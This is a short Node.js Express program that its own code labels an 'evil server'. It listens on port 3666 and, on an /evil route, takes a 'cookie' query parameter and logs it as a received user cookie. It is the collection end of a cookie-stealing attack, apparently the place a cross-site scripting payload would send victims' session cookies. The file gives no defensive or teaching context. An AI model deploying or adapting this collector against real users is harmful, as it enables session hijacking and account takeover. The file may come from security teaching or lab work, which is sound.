const express = require('express')
const app = express()
const port = 3666

app.get('/evil', (req, res) => {
  const cookie = req.query.cookie
  console.log(`🔴 Received user cookie: ${cookie}`)
})

app.listen(port, () => {
  console.log(`Evil server listening on port ${port}`)
})
